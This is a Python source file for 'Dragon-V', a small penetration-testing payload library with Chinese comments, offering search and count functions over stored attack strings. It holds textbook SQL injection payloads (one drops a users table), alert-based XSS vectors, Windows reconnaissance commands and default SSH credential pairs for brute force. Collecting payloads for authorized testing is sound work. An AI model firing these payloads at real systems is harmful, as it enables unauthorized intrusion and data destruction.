#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Dragon-V 滲透負載資料庫（Metasploit 相容負載庫）。"""

from __future__ import annotations

from typing import Any, Dict, List


class MCPPayloadsDatabase:
    """滲透負載資料庫：SQLi / XSS / 命令執行等分類。"""

    def __init__(self) -> None:
        self.payloads = self._load_payloads()

    def _load_payloads(self) -> Dict[str, Any]:
        return {
            "web_application": {
                "sql_injection": {
                    "basic_sqli": {
                        "name": "基礎 SQL 注入",
                        "description": "基本的 SQL 注入攻擊負載",
                        "payloads": [
                            "' OR '1'='1",
                            "' OR 1=1--",
                            "' UNION SELECT NULL--",
                            "1' AND SLEEP(5)--",
                            "'; DROP TABLE users--",
                        ],
                        "technique": "SQL Injection",
                        "risk": "High",
                        "platform": "All",
                    },
                    "time_based_sqli": {
                        "name": "時間型 SQL 注入",
                        "description": "以延遲判斷資料庫存在性的 SQL 注入負載",
                        "payloads": [
                            "1' AND SLEEP(5)--",
                            "1' OR SLEEP(5)#",
                            "'; WAITFOR DELAY '00:00:05'--",
                        ],
                        "technique": "SQL Injection (Time-based)",
                        "risk": "High",
                        "platform": "All",
                    },
                },
                "xss": {
                    "reflected_xss": {
                        "name": "反射型 XSS",
                        "description": "反射型跨站腳本攻擊負載",
                        "payloads": [
                            "<script>alert('XSS')</script>",
                            "<img src=x onerror=alert('XSS')>",
                            "<svg onload=alert('XSS')>",
                            "<body onload=alert('XSS')>",
                        ],
                        "technique": "Cross-Site Scripting",
                        "risk": "Medium",
                        "platform": "Web",
                    }
                },
            },
            "system_exploits": {
                "windows": {
                    "cmd_execution": {
                        "name": "Windows 命令執行",
                        "description": "Windows 系統命令執行負載",
                        "payloads": [
                            "cmd.exe /c whoami",
                            "powershell -c Get-Process",
                            "net user",
                            "systeminfo",
                        ],
                        "technique": "Command Execution",
                        "risk": "High",
                        "platform": "Windows",
                    }
                }
            },
            "network_services": {
                "ssh": {
                    "ssh_bruteforce": {
                        "name": "SSH 暴力破解",
                        "description": "SSH 常用使用者名稱密碼組合",
                        "payloads": ["root:root", "admin:admin", "test:test", "guest:guest"],
                        "technique": "Brute Force",
                        "risk": "High",
                        "platform": "SSH",
                    }
                }
            },
        }

    def search_payloads(self, keyword: str, limit: int = 20) -> List[Dict[str, Any]]:
        kw = keyword.strip().lower()
        if not kw:
            return []
        count = max(1, min(limit, 100))
        results: List[Dict[str, Any]] = []
        for category_name, category in self.payloads.items():
            for subcategory_name, subcategory in category.items():
                for payload_name, payload_data in subcategory.items():
                    if kw in payload_data["name"].lower() or kw in payload_data["description"].lower():
                        results.append(
                            {
                                "category": category_name,
                                "subcategory": subcategory_name,
                                "name": payload_data["name"],
                                "description": payload_data["description"],
                                "payloads": payload_data["payloads"][:3],
                            }
                        )
                        if len(results) >= count:
                            return results
        return results

    def get_all_payloads_count(self) -> Dict[str, int]:
        stats: Dict[str, int] = {}
        total = 0
        for category_name, category in self.payloads.items():
            category_count = 0
            for subcategory in category.values():
                for payload_data in subcategory.values():
                    category_count += len(payload_data["payloads"])
                    total += len(payload_data["payloads"])
            if category_count:
                stats[category_name] = category_count
        stats["total"] = total
        return stats


if __name__ == "__main__":
    _db = MCPPayloadsDatabase()
    _stats = _db.get_all_payloads_count()
    print(f"總負載數量: {_stats['total']}")
    for _r in _db.search_payloads("SQL"):
        print(f"- {_r['name']}: {_r['description']}")